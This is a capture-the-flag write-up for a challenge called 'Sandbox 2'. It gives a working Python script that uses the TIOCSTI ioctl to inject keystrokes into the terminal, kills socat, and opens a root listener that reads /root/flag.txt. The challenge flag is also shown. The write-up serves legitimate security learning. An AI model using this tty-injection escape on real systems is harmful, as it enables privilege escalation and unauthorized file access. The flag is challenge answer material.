# Sandbox 2

Author: `cobra`

I think I fixed it... just removed that silly ampersand.

## Solution

Same as before, but since socat is not running in the background we are directly accessing the tty for the execution of `start.sh`. 

Thus, we can send an interrupt signal to the process with `\x03`, then pass in more commands in the context of that execution. However, since interrupting socat also means we cannot connect to the socket anymore, we need to open a new listener on the socket.

We can simply use socat again, but this time instead of running the sandbox, we can execute any command as root, so we can simply cat the flag file.

```python
import ctypes

libc = ctypes.CDLL('libc.so.6')
open = libc.open
open.argtypes = [ctypes.c_char_p, ctypes.c_int]
open.restype = ctypes.c_int
fd = open(b'/dev/tty', 2)
print(fd)

ioctl = libc.ioctl
ioctl.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
ioctl.restype = ctypes.c_int
TIOCSTI = 0x5412
# \x03 sends interrupt, closing the socat process
# then we send another socat command so that 1337 will now run that
cmd = '\x03socat TCP-LISTEN:1337,reuseaddr,fork EXEC:\"cat /root/flag.txt\",stderr\n'
for c in cmd:
    try:
        r = ioctl(fd, TIOCSTI, ctypes.c_char_p(c.encode()))
        if r < 0:
            print('ioctl failed')
            break
    except:
        pass

libc.close(fd)
print('done')
```

The next time we reconnect, we get the flag:
```
python3 solve.py

Disconnected from socket. Try reconnecting? (y/n): y

gigem{n3x7_71m3_1ll_us3_4_p7y_0r_4rch}
```

flag:
`gigem{n3x7_71m3_1ll_us3_4_p7y_0r_4rch}`
